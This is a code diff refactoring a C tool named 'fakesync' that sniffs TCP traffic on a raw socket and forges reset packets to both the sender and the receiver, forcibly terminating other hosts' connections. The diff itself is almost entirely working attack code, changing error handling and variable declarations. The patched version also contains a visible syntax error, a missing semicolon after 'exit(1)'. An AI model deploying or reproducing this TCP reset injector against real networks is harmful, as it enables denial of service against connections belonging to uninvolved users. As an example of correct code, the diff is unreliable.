@@ -94,7 +94,7 @@ int main(int argc, char *argv[]) {
     // open attack socket
     if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("fakesync: socket\n");
-        exit(-1);
+        exit(1);
     }
 
     // pre-fill TCP, IP and pseudo headers
@@ -135,7 +135,7 @@ int main(int argc, char *argv[]) {
     // Open sniff socket
     if ((sniff_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
         perror("fakesync: socket\n");
-        exit(-1);
+        goto error;
     }
 
     // main loop
@@ -145,10 +145,11 @@ int main(int argc, char *argv[]) {
         if ((num = recvfrom(sniff_sock, buf, sizeof buf, 0, (struct sockaddr *)&saddr, &addr_len)) < 0)
         {
             perror("recvfrom()\n");
-            exit(1);
+            goto error;
         }
 
         if (!fork()) {
+            close(sniff_sock); // no longer needed
             iph = (struct iphdr *) buf;
             tcph= (struct tcphdr*) (buf + iph->ihl * 4);
 
@@ -158,16 +159,19 @@ int main(int argc, char *argv[]) {
             if (tcph -> rst == 1) goto final; // ignore reset packets
             // print_tcp_packet(buf, num); // log the packet
 
-            reset(attack_sock, &datagram, &pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
-            reset(attack_sock, &datagram, &pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq)+1, ntohl(tcph->seq)); // reset the sender
+            reset(attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
+            reset(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // reset the sender
             goto final;
         }
     }
 
 final:
     close(attack_sock);
-    close(sniff_sock);
     return 0;
+error:
+    close(attack_sock);
+    close(sniff_sock);
+    exit(1)
 }
 
 void sigchld_handler(int s)
@@ -217,17 +221,13 @@ void reset(const int attack_sock, const char *datagram, const char *pseudo_packe
     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
 {
     int num;
-    struct iphdr *iph;
-    struct tcphdr *tcph, *cstcph;
-    struct pshdr *psh;
-    size_t tcp_len;
     struct sockaddr_in sa;
 
-    tcp_len = sizeof(struct tcphdr);
-    iph = (struct iphdr *) datagram;
-    tcph = (struct tcphdr *) (iph + 1);
-    psh = (struct pshdr *) pseudo_packet;
-    cstcph = (struct tcphdr *) (psh + 1);
+    size_t tcp_len = sizeof(struct tcphdr);
+    struct iphdr *iph = (struct iphdr *) datagram;
+    struct tcphdr *tcph = (struct tcphdr *) (iph + 1);
+    struct pshdr *psh = (struct pshdr *) pseudo_packet;
+    struct tcphdr *cstcph = (struct tcphdr *) (psh + 1);
 
     // dynamic TCP fields
     tcph -> source = sport; // source port
